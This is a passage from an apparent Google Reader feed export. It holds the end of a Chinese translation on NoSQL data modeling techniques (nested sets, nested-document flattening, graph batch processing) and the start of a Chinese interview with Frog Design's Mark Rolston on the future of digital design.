文档数据, Search Engines 搜索引擎</p>\n<h5>(14) 嵌套集 Nested Sets</h5>\n<p><a href=\"http://en.wikipedia.org/wiki/Nested_set_model\">Nested sets</a> 嵌套集是树形结构的标准技术。它被广泛地用在了关系性数据库中，它完全地适用于 Key-Value 键值对数据库 和 Document Databases 文档数据库。这个技术的想法是把叶子结点存储成一个数组，并通过使用索引的开始和结束来映射每一个非叶子结点到一个叶子结点集，就如下图所示一样：</p>\n<div>\n<p style=\"text-align:center\"><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/nested-sets.png\"><img title=\"nested-sets\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/nested-sets.png?w=594\" alt=\"\"><br>\n</a>Modeling of eCommerce Catalog using Nested Sets</p>\n</div>\n<p>这样的数据结构对于immutable data不变的数据 有非常不错的效率，因为其点内存空间小，并且可以很快地找出所有的叶子结点而不需要树的遍历。尽管如此，在插入和更新上需要很高的性能成本，因为新的叶子结点需要大规模地更新索引。</p>\n<p><strong>适用性</strong>: Key-Value Stores 键值数据库, Document Databases 文档数据库</p>\n<h4>(15) 嵌套文档扁平化：有限的字段名 Nested Documents Flattening: Numbered Field Names</h4>\n<p>搜索引擎基本上来说和扁平文档一同工作，如：每一个文档是一个扁平的字段和值的例表。这种数据模型的用来把业务实体映射到一个文本文档上，如果你的业务实体有很复杂的内部结构，这可能会变得很有挑战。一个典型的挑战是把一个有层级的文档映映射出来。例如，文档中嵌套另一个文档。让我们看看下面的示例：</p>\n<div>\n<p style=\"text-align:center\"><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/nested-documents-1.png\"><img title=\"nested-documents-1\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/nested-documents-1.png?w=594\" alt=\"\"><br>\n</a>Nested Documents Problem</p>\n</div>\n<p>上面的每一个业务实体代码一种简历。其包括了人名和一个技能列表。我把这个层级文档映射成一个文本文档，一种方法是创建 <em>Skill</em> 和 <em>Level</em> 字段。这个模型可以通过技术或是等级来搜索一个人，而上图标注的那样的组合查询则会失败。（陈皓注：因为分不清Excellent是否是Math还是Poetry上的）</p>\n<p>在引用中的 [4.6] 给出了一种解决方案。其为每个字段都标上数字 <em>Skill_i</em> 和 <em>Level_i</em>，这样就可以分开搜索每一个对（下图中使用了OR来遍历查找所有可能的字段）:</p>\n<div>\n<p style=\"text-align:center\"><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/nested-documents-3.png\"><img title=\"nested-documents-3\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/nested-documents-3.png?w=594\" alt=\"\"><br>\n</a>Nested Document Modeling using Numbered Field Names</p>\n</div>\n<p>这样的方式根本没有扩展性，对于一些复杂的问题来说只会让代码复杂度和维护工作变大。</p>\n<p><strong>适用性</strong>: Search Engines 全文搜索</p>\n<h5>(16)嵌套文档扁平化：邻近查询 Nested Documents Flattening: Proximity Queries</h5>\n<p>在附录 [4.6]中给出了这个技术用来解决扁平层次文档。它用邻近的查询来限制可被查询的单词的范围。下图中，所有的技能和等级被放在一个字段中，叫 SkillAndLevel，查询中出现的 “Excellent” 和 “Poetry” 必需一个紧跟另一个：</p>\n<div>\n<p style=\"text-align:center\"><a href=\"http://coolshell.cn/wp-content/uploads/2012/05/nested-documents-2.png\"><img title=\"nested-documents-2\" src=\"http://coolshell.cn/wp-content/uploads/2012/05/nested-documents-2.png?w=594\" alt=\"\"><br>\n</a>Nested Document Modeling using Proximity Queries</p>\n</div>\n<p>附录 [4.3] 中讲述了这个技术被用在Solr中的一个成功案例。</p>\n<p><strong>适用性</strong>: Search Engines 全文搜索</p>\n<h5>(17) 图结构批处理 Batch Graph Processing</h5>\n<p>Graph databases 图数据库，如 neo4j 是一个出众的图数据库，尤其是使用一个结点来探索邻居结点，或是探索两个或少量结点前的关系。但是处理大量的图数据是很没有效率的，因为图数据库的性能和扩展性并不是其目的。分布式的图数据处理可以被 MapReduce 和 Message Passing pattern 来处理。如： <a title=\"MapReduce Patterns, Algorithms, and Use Cases\" href=\"http://highlyscalable.wordpress.com/2012/02/01/mapreduce-patterns/\">在我前一篇的文章中的那个示例</a>。这个方法可以让 Key-Value stores, Document databases, 和 BigTable-style databases 适合于处理大图。</p>\n<p><strong>Applicability</strong>: Key-Value Stores, Document Databases, BigTable-style Databases</p>\n<h4>参考</h4>\n<p>Finally, I provide a list of useful links related to NoSQL data modeling:</p>\n<ol>\n<li>Key-Value Stores:\n<ol>\n<li><a href=\"http://www.devshed.com/c/a/MySQL/Database-Design-Using-KeyValue-Tables/\">http://www.devshed.com/c/a/MySQL/Database-Design-Using-KeyValue-Tables/</a></li>\n<li><a href=\"http://antirez.com/post/Sorting-in-key-value-data-model.html\">http://antirez.com/post/Sorting-in-key-value-data-model.htm</a>l</li>\n<li><a href=\"http://stackoverflow.com/questions/3554169/difference-between-document-based-and-key-value-based-databases\">http://stackoverflow.com/questions/3554169/difference-between-document-based-and-key-value-based-databases</a></li>\n<li><a href=\"http://dbmsmusings.blogspot.com/2010/03/distinguishing-two-major-types-of_29.html\">http://dbmsmusings.blogspot.com/2010/03/distinguishing-two-major-types-of_29.html</a></li>\n</ol>\n</li>\n<li>BigTable-style Databases:\n<ol>\n<li><a href=\"http://www.slideshare.net/ebenhewitt/cassandra-datamodel-4985524\">http://www.slideshare.net/ebenhewitt/cassandra-datamodel-4985524</a></li>\n<li><a href=\"http://www.slideshare.net/mattdennis/cassandra-data-modeling\">http://www.slideshare.net/mattdennis/cassandra-data-modeling</a></li>\n<li><a href=\"http://nosql.mypopescu.com/post/17419074362/cassandra-data-modeling-examples-with-matthew-f-dennis\">http://nosql.mypopescu.com/post/17419074362/cassandra-data-modeling-examples-with-matthew-f-dennis</a></li>\n<li><a href=\"http://s-expressions.com/2009/03/08/hbase-on-designing-schemas-for-column-oriented-data-stores/\">http://s-expressions.com/2009/03/08/hbase-on-designing-schemas-for-column-oriented-data-stores/</a></li>\n<li><a href=\"http://jimbojw.com/wiki/index.php?title=Understanding_Hbase_and_BigTable\">http://jimbojw.com/wiki/index.php?title=Understanding_Hbase_and_BigTable</a></li>\n</ol>\n</li>\n<li>Document Databases:\n<ol>\n<li><a href=\"http://www.slideshare.net/mongodb/mongodb-schema-design-richard-kreuters-mongo-berlin-preso\">http://www.slideshare.net/mongodb/mongodb-schema-design-richard-kreuters-mongo-berlin-preso</a></li>\n<li><a href=\"http://www.michaelhamrah.com/blog/2011/08/data-modeling-at-scale-mongodb-mongoid-callbacks-and-denormalizing-data-for-efficiency/\">http://www.michaelhamrah.com/blog/2011/08/data-modeling-at-scale-mongodb-mongoid-callbacks-and-denormalizing-data-for-efficiency/</a></li>\n<li><a href=\"http://seancribbs.com/tech/2009/09/28/modeling-a-tree-in-a-document-database/\">http://seancribbs.com/tech/2009/09/28/modeling-a-tree-in-a-document-database/</a></li>\n<li><a href=\"http://www.mongodb.org/display/DOCS/Schema+Design\">http://www.mongodb.org/display/DOCS/Schema+Design</a></li>\n<li><a href=\"http://www.mongodb.org/display/DOCS/Trees+in+MongoDB\">http://www.mongodb.org/display/DOCS/Trees+in+MongoDB</a></li>\n<li><a href=\"http://blog.fiesta.cc/post/11319522700/walkthrough-mongodb-data-modeling\">http://blog.fiesta.cc/post/11319522700/walkthrough-mongodb-data-modeling</a></li>\n</ol>\n</li>\n<li>Full Text Search Engines:\n<ol>\n<li><a href=\"http://www.searchworkings.org/blog/-/blogs/query-time-joining-in-lucene\">http://www.searchworkings.org/blog/-/blogs/query-time-joining-in-lucene</a></li>\n<li><a href=\"http://www.lucidimagination.com/devzone/technical-articles/solr-and-rdbms-basics-designing-your-application-best-both\">http://www.lucidimagination.com/devzone/technical-articles/solr-and-rdbms-basics-designing-your-application-best-both</a></li>\n<li><a href=\"http://blog.griddynamics.com/2011/07/solr-experience-search-parent-child.html\">http://blog.griddynamics.com/2011/07/solr-experience-search-parent-child.html</a></li>\n<li><a href=\"http://www.lucidimagination.com/blog/2009/07/18/the-spanquery/\">http://www.lucidimagination.com/blog/2009/07/18/the-spanquery/</a></li>\n<li><a href=\"http://blog.mgm-tp.com/2011/03/non-standard-ways-of-using-lucene/\">http://blog.mgm-tp.com/2011/03/non-standard-ways-of-using-lucene/</a></li>\n<li><a href=\"http://www.slideshare.net/MarkHarwood/proposal-for-nested-document-support-in-lucene\">http://www.slideshare.net/MarkHarwood/proposal-for-nested-document-support-in-lucene</a></li>\n<li><a href=\"http://mysolr.com/tips/denormalized-data-structure/\">http://mysolr.com/tips/denormalized-data-structure/</a></li>\n<li><a href=\"http://sujitpal.blogspot.com/2010/10/denormalizing-maps-with-lucene-payloads.html\">http://sujitpal.blogspot.com/2010/10/denormalizing-maps-with-lucene-payloads.html</a></li>\n<li><a href=\"http://java.dzone.com/articles/hibernate-search-mapping-entit\">http://java.dzone.com/articles/hibernate-search-mapping-entit</a></li>\n</ol>\n</li>\n<li>Graph Databases:\n<ol>\n<li><a href=\"http://docs.neo4j.org/chunked/stable/tutorial-comparing-models.html\">http://docs.neo4j.org/chunked/stable/tutorial-comparing-models.html</a></li>\n<li><a href=\"http://blog.neo4j.org/2010/03/modeling-categories-in-graph-database.html\">http://blog.neo4j.org/2010/03/modeling-categories-in-graph-database.html</a></li>\n<li><a href=\"http://skillsmatter.com/podcast/nosql/graph-modelling\">http://skillsmatter.com/podcast/nosql/graph-modelling</a></li>\n<li><a href=\"http://www.umiacs.umd.edu/%7Ejimmylin/publications/Lin_Schatz_MLG2010.pdf\">http://www.umiacs.umd.edu/~jimmylin/publications/Lin_Schatz_MLG2010.pdf</a></li>\n</ol>\n</li>\n<li>Demensionality Reduction:\n<ol>\n<li><a href=\"http://www.slideshare.net/mmalone/scaling-gis-data-in-nonrelational-data-stores\">http://www.slideshare.net/mmalone/scaling-gis-data-in-nonrelational-data-stores</a></li>\n<li><a href=\"http://blog.notdot.net/2009/11/Damn-Cool-Algorithms-Spatial-indexing-with-Quadtrees-and-Hilbert-Curves\">http://blog.notdot.net/2009/11/Damn-Cool-Algorithms-Spatial-indexing-with-Quadtrees-and-Hilbert-Curves</a></li>\n<li><a href=\"http://www.trisis.co.uk/blog/?p=1287\">http://www.trisis.co.uk/blog/?p=1287</a></li>\n</ol>\n</li>\n</ol>\n<p>（全文完）\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:11px;margin-bottom:50px\">————————============ <b>感谢 <a href=\"http://42qu.com/\">42qu.com</a> 为本站提供 <a href=\"http://vps.42qu.com/\"> VPS</a></b> ============————————</div>\n<table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\">\n    \n    <tr>\n        <td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能也喜欢：</font></b></td>\n    </tr>\n    \n        <tr>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\">\n                    <a title=\"SQL的Where语句\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1889.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7270.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/11/08/10437720.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">SQL的Where语句</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"【原创】SQL栏目树的代码\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F962.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7270.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">【原创】SQL栏目树的代码</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"图解SQL的Join\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F3463.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7270.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2011/06/22/13778761.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">图解SQL的Join</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"几篇技术文章\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F3311.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7270.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">几篇技术文章</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"Web程序的最佳测试数据\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F1957.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7270.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Web程序的最佳测试数据</font>\n                    </a>\n                </td>\n        </tr>\n    \n    <tr>\n        <td colspan=\"5\" align=\"right\">\n            <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems\" title=\"无觅相关文章插件\">\n                <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font>\n            </a>\n        </td>\n    </tr>\n</table><h3>相关文章</h3><ul><li>2009年12月01日 -- <a href=\"http://coolshell.cn/articles/1889.html\" title=\"SQL的Where语句\">SQL的Where语句</a></li><li>2012年06月20日 -- <a href=\"http://coolshell.cn/articles/7490.html\" title=\"性能调优攻略\">性能调优攻略</a></li><li>2012年02月21日 -- <a href=\"http://coolshell.cn/articles/6639.html\" title=\"千万别惹程序员 \">千万别惹程序员 </a></li><li>2011年11月10日 -- <a href=\"http://coolshell.cn/articles/5826.html\" title=\"千万别用MongoDB？真的吗？！\">千万别用MongoDB？真的吗？！</a></li><li>2011年06月08日 -- <a href=\"http://coolshell.cn/articles/4795.html\" title=\"开源中最好的Web开发的资源\">开源中最好的Web开发的资源</a></li><li>2011年01月11日 -- <a href=\"http://coolshell.cn/articles/3463.html\" title=\"图解SQL的Join\">图解SQL的Join</a></li><li>2010年12月31日 -- <a href=\"http://coolshell.cn/articles/3433.html\" title=\"6个有用的MySQL语句\">6个有用的MySQL语句</a></li></ul></p>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1336640370126",
    "timestampUsec" : "1336640370126050",
    "id" : "tag:google.com,2005:reader/item/3e8990ac00abe9ec",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "设计" ],
    "title" : "Frog Design的首席创意执行官Mark Rolston 专访",
    "published" : 1348550864,
    "updated" : 1348550864,
    "alternate" : [ {
      "href" : "http://blog.xiqiao.info/2012/09/25/1164",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p style=\"text-align:center\"><span style=\"font-weight:bold\">我们所做的一切都是为了创新</span></p>\n<p style=\"text-align:right\"><strong>—— 《程序员》专访青蛙设计的首席创意执行官Mark Rolston</strong></p>\n<p>特约撰稿人：西乔</p>\n<p>听说Mark Rolston  10月又要来中国，在MDCC做演讲了。我把专访重新翻上来一下。</p>\n<p style=\"text-align:right\"><span style=\"font-size:12px;color:#999\"><a href=\"http://www.frogdesign.com/\"><img src=\"http://blog.xiqiao.info/blogimg/frog/friedolin.jpg\" alt=\"\" width=\"191\" height=\"132\" align=\"right\"></a></span></p>\n<p style=\"font-size:12px;color:#999\">“为什么全球主要的巨人企业如迪斯尼、微软、通用电气和摩托罗拉在掌握地球上一切资源后，都还需要转向如青蛙设计这样的机构寻求建议或解决方案？”</p>\n<p style=\"font-size:12px;color:#999\">青蛙设计在多年前回答了这个问题：“ 因为敏感而新鲜的想法难以存活在大多数企业的毒性环境中。”</p>\n<p>德国的工业设计举世闻名，包豪斯和乌尔姆设计学院作为现代设计最重要的摇篮，培养了两代设计师，开创了系统的设计方法和理性设计的原则。但到了上世纪60年代，商业主义设计盛行，德国工业设计中机械化且刻板的特征导致它们逐渐失去竞争力。德国国内一些新兴的设计公司开始探索新的出路，青蛙设计就是其中的代表。在创立之初，青蛙设计的目标就把设计定位为策略性专业，与工业和商业相结合，创造出审美和功能兼备的科技产品。它希望所有的设计师都能够掌握自己的命运，不甘心只是做一个装饰工匠。</p>\n<p><img src=\"http://blog.xiqiao.info/blogimg/frog/apple1984.png\" alt=\"\" width=\"200\" height=\"252\" align=\"left\">1982年，<a href=\"http://www.frogdesign.cn/about/history\">青蛙设计</a>获得了和苹果合作的机会，受邀到加州开设了分公司。它提供的设计背离了当时科技产品笨重、单调的外观，提供了一种新的设计语言，其中包括如下一些策略：</p>\n<p>* 苹果电脑将会是小巧、干净、白色的。<br>\n* 所有图形和字体都必须是简洁而有秩序的。<br>\n* 最终产品将由最先进的工厂车间打造，具有灵巧和高科技感的外观。</p>\n<p>30年过去了，我们可以惊讶地发现，这些策略仍然作为苹果风格的灵魂，沿用至今。</p>\n<p>近60年间，青蛙设计业务已经从工业设计、用户界面设计，发展为实现了两者的融合，同时参与品牌战略设计和社会创新服务概念的策划。它们的作品包括将传统加油站改造<a href=\"http://www.frogdesign.cn/work/ecotality.html\">为电动汽车服务的充电站</a>；使用移动技术设计未来的<a href=\"http://www.frogdesign.cn/work/project-m.html\">数字医疗方案</a>；结合数字世界的优势和真实世界的购物体验所设计的<a href=\"http://www.frogdesign.cn/work/intel-pos.html\">新型零售终端</a>，可提供智能化建议和实时互动。今天的青蛙设计早已不再称自己为一家设计公司，而是一家创新公司。 正是对创新的不懈追求，加上远见和冒险精神，让青蛙设计从一个小工作室，成长为今天令全球尊敬的国际设计巨头。</p>\n<p><a href=\"http://www.frogdesign.cn/work/intel-pos.html\"><img src=\"http://blog.xiqiao.info/blogimg/frog/intel_pos.jpg\" alt=\"\" width=\"600\" height=\"338\"></a></p>\n<p><img src=\"http://blog.xiqiao.info/blogimg/frog/HEADSHOT_M.Rolston.jpg\" alt=\"\" width=\"287\" height=\"232\" align=\"right\"></p>\n<p>Mark 负责青蛙设计的全球创意构想，是数字媒体、用户界面，设计、电子商务和移动应用领域国际公认的专家。作为一个早期的互联网先锋,他于1996年创建了青蛙设计的数字媒体部门。在2000年推动了Dell.com 的创新, 让Dell.com成为迄今为止盈利最高的网站，树立了电子商务的新标准。又与 i2、微软、SAP及Sun Microsystem等品牌合作，不断地改进人们生活的数字体验。</p>\n<p style=\"color:#090\"><strong>西乔：</strong>您1996年在青蛙设计 创立了数字媒体部门(Digital Media Design group)？ 这在当年很有远见。请问创立这个部门的时候您多大？是什么样的想法促成了您来做这件事？</p>\n<p><strong>Mr. Rolston：</strong>创立这个部门的时候我21岁。  我一直接触计算机，很小就开始学习编程，同时也是一名设计师。那段时间我一直在做软件开发，而且希望利用设计让软件变得更好。</p>\n<p>任何领域的设计师，都梦想能去改变世界，而在那个年代，改变世界的最好的方式是通过设计软件。软件就像动力引擎一样，改变在这个星球上和人们生活有关的一切。即使你并不亲自使用这些软件，它们也改变了你身边的世界。而当94年我来到青蛙设计的时候，我发现这里拥有我想要的一切条件。</p>\n<p>那时，青蛙设计已经在设计实体产品方面取得很大的成功，拥有近30年的丰富经验。但软件设计做得并不多。最初这个部门是帮助已有的工业设计和产品设计部门去解决和软件相关的问题，但很快我们发现很多问题的核心并不是产品的工业设计，而是产品上的软件。所以事情很快发生了改变。到1998年，青蛙设计把注意力转移到了软件的设计上。</p>\n<p>当时，还有许多人质疑为什么你们投入如此多的精力在软件上。但到2000年时。人人都知道软件是未来，将会是设计的首要推动力。</p>\n<p style=\"color:#090\"><strong>西乔： </strong>当年的数字媒体设计部门现在已经发展为青蛙设计 的主营业务之一，这充分证明了你当年的前瞻性。作为一个数字设计领域的先锋，在16年后，你对数字化未来有什么预见性看法？</p>\n<p><strong>Mr. Rolston：</strong>这是我最喜欢的话题。计算机已经给人类和社会带来了本质改变。但是目前人们还是必须借助特定的设备来操作计算机。你必须拥有一部智能手机，或者桌子上必须放着一台电脑， 这些设备是我们通往软件世界的走廊。但同时它们和自然世界也是分离的。你需要特別的技能，在特别的场景下去操作它，而无法摆脱按键，屏幕，输入，输出。</p>\n<p>但我认为计算机应该和我们的使用情景融为一体，而不是一件需要转换焦点去进行特殊操作或交互的对象。所以我认为这些设备在未来可能消失。在未来，当我需要打电话或者搜索信息时，我能够直接利用我身边的环境，用更自然的方式来完成这些任务。</p>\n<p><img src=\"http://blog.xiqiao.info/blogimg/frog/Intel-Digital-Signage.jpg\" alt=\"\" width=\"600\" height=\"366\"></p>\n<p><span style=\"color:#090\"><strong>西乔： </strong>是直觉式 (intuitive) 设计吗？</span></p>\n<p><strong>Mr. Rolston：</strong>不仅仅是更直觉式的操作方式，而是真正把数字世界和自然世界合二为一。计算机会变得更加适合与人类交流。交互方式会变得更自然，更符合人类习惯。而触屏技术正是实现这一趋势的突破。在未来，计算机会拥有自己的意识，能够不断学习和识别周围的一切，我们可以和它共处一室，使用语音指令，像与人对话一样在3D空间里和计算机进行沟通。</p>\n<p style=\"color:#090\"><strong>西乔： </strong>我原本想让您预测一下关于移动终端在未来的外形设计，但显然您已经回答了这个问题。您认为未来的终端不会有固定的所谓外形，它将可能存在于任何情境中，可能是任何东西对吗？</p>\n<p><strong>Mr. Rolston：</strong>对。这就好比是剑，对于一个统治者，剑最初是武器，但后来变成了力量的象征和对领土统治的申明。剑的实际功能消失了，象征性的意义保留下来。 所以现在我们所理解的终端也会这样，形态会消失，但延伸价值会保留下来。 今天我们拥有这些设备，就像剑一样，给你力量。</p>\n<p>人们也将不再只通过具体的功能来标识某一物理事物。它可以成为任何你希望他成为的东西。 人机交互也不再被绑定在某一设备上，而是和环境完全地融入在一起。这一切都是由人机交互界面的快速发展所带来的。我认为<a href=\"http://www.youtube.com/watch?v=fpN9rwThmwQ\">人机交互会经过5个阶段的发展</a>：</p>\n<p>1 计算机成为人们生活的一部分。</p>\n<p>2 我们随身携带它。</p>\n<p>3 我们通过它来感知世界。</p>\n<p>4 计算机装备在我们身体上。</p>\n<p>5 我们就是计算机本身。</p>\n<p><a href=\"http://www.slideshare.net/frogdesign/the-future-of-computing-tedx-austin\"><img src=\"http://blog.xiqiao.info/blogimg/frog/5_stages.jpg\" alt=\"\" width=\"600\" height=\"240\"></a></p>\n<p>如今，我们正在给物理世界打上各种标注；我们身边到处都能看到各种形态计算机、个人电子设备；我们的身体正在变成节点，外围甚至是交互界面本身。也许当我们正在谈论的未来，在某天最终到达的时候，它可能看起来已变得很理所当然。但时尚不正是把今天看起来奇怪的一切变成明天被普遍接受的事物吗？</p>\n<p>当一个设备可以记录你的健康指数，同时也用于更新你的SNS状态的时候，想象一下会发生什么? 你的心跳会成为你与别人对话的一部分。</p>\n<p><a href=\"http://www.slideshare.net/frogdesign/five-futures-12785365\"><img src=\"http://blog.xiqiao.info/blogimg/frog/health.jpg\" alt=\"\" width=\"600\" height=\"428\"></a></p>\n<p><a href=\"http://www.slideshare.net/frogdesign/five-futures-12785365\"><img src=\"http://blog.xiqiao.info/blogimg/frog/connections.jpg\" alt=\"\" width=\"600\" height=\"441\"></a></p>\n<p style=\"color:#090\"><strong>西乔：</strong>它们最终会成为人体的一部分吗，比如植入人体？</p>\n<p><strong>Mr. Rolston：</strong>当然。但需要花上较长的时间。有可能在未来十年内，开始有小规模的实验，如植入式的无线电通信设备。假设一下这个场景，当我们希望非正式地获得关于自己身体的信息，可以往手臂里植入很小的医疗设备，然后得到一些预测信息。例如前一夜的醉酒会让今天我的身体发生些什么？</p>\n<p style=\"color:#090\"><strong>西乔：</strong>我看过您在2009年的演讲，关于移动相关的技术和设计的《<a href=\"http://www.dustinkirk.com/2009/03/24/mark-rolston-the-white-box/\">The white box</a>》。你在那次演讲里提到了 “第六感设备”（The SixthSense device）, 这个概念是在Pranav Mistry的<a href=\"http://www.ted.com/talks/pattie_maes_demos_the_sixth_sense.html\">TED</a>演讲中所展示的一种人际交互设备。这个TED演讲当年在中国也很流行，人们对真实世界与数字世界之间的这种融合感到欣喜和震惊。您记得吗？</p>\n<p><strong>Mr. Rolston：</strong>是的。第六感是一个早期的实验性设计，拥有很好的创意。我们与他们有合作。</p>\n<p><a href=\"http://en.wikipedia.org/wiki/The_Sixth_Sense\"><img src=\"http://blog.xiqiao.info/blogimg/frog/Frog_the_sixth_sense.jpg\" alt=\"\" width=\"600\" height=\"419\"></a></p>\n<p style=\"color:#090\"><strong>西乔：</strong>但是有人质疑它的可商用性和使用精度。</p>\n<p><strong>Mr. Rolston：</strong> 我们一直在推进它，寻求更明朗，更高水准的解决方案。<br>\n我们尝试将交互界面投影到更多不同的环境中，和新的应用场景结合。 而且现在投影设备也有了更好的选择。<br>\n每一年它都在变得更好。你应该对这个世界充满想象力。这类设备的识别精度，准确度和运算能力都在提高，它看到的东西越多，识别能力越强。就像Google一样，用户的每次搜索，都会让系统变得更加智能，让下一次搜索变得更快、更准确。每天由大量用户带来的上万次使用，会积累成惊人的结果。这就是商用化的前景。现在我们已经知道它可以和电子游戏设备进行连接，你可以期待这种连接很快放到笔记本，智能手机和其它许多设备上。</p>\n<p style=\"color:#090\"><strong>西乔：</strong>最近有很多国内外的设计Blog都在推荐青蛙设计最新的一个设计案例：<a href=\"http://www.bloomberg.com/company/\">Bloomberg’s Big Beautiful Data</a>。它使用了HTML5和实时数据，在风格上也很容易让人联想到Metro UI。请问您怎样看待 Metro UI 在设计和交互方式的突破和适用性？</p>\n<p><strong>Mr. Rolston：</strong> 我认为微软是一家高品质的公司，在某些独特的领域中取得了非凡的表现。但随着全球层面的产品革新风潮，如果只维持传统风格，他们将会受到很大挑战。<br>\n微软过去太执着于修补已有的产品，不够有突破性，如果希望赢得人们对他们设计的敬仰，类似现在苹果公司得到的，还是要走出自我的限制才行。微软能够走出这一步，创造一种属于自己的新的设计语言，是非常好的事。</p>\n<p>Metro UI 这套设计语言，要求这个平台上的应用都要符合这种风格，这相当于限制了边界。开发者们也需要经受良好的训练才能掌控这种风格。成熟的框架是安卓和iOS平台成功的原因之一：通过设定一套设计语言，身处任何文化下的开发者都可以避免混乱，开发出和平台相协调的应用。但同时这也有很多弊端：比如增加开发者的学习成本。当希望创造一些框架中没有的独特设计时，也要付出很高的代价。</p>\n<p><a href=\"http://www.bloomberg.com/company/\"><img src=\"http://blog.xiqiao.info/blogimg/frog/BLP-ipad.jpg\" alt=\"\" width=\"600\" height=\"511\"></a></p>\n<p style=\"color:#090\"><strong>西乔：</strong>这个设计案例同样采用了数据可视化（data visualisation) 的表现手法。关于数据可视化的应用前景，您怎么看？</p>\n<p><strong>Mr.Rolston：</strong>数据可视化会变得非常重要。在过去，数据的获取是有限的，人们也只能利用现有的数据来产生和获取价值，但是现在我们拥有了历史积累的海量数据，去解释和分析它们有重要的意义。世界上大部分数据未加工的，我们要做的不仅仅是把它们图形化，而是通过结构化数据，对它们进行组合、运算，提炼出更深的含义与价值。不仅仅是了解个体数据，同时也获得对整体模式的认知。伴随着数据存储、处理与分析能力的提高，未来它会是一个很大的产业，成为设计的一个重要分支。对于所有人，这都是新的挑战和机会。</p>\n<p style=\"color:#090\"><strong>西乔：</strong> 不少中国人第一次知道青蛙设计 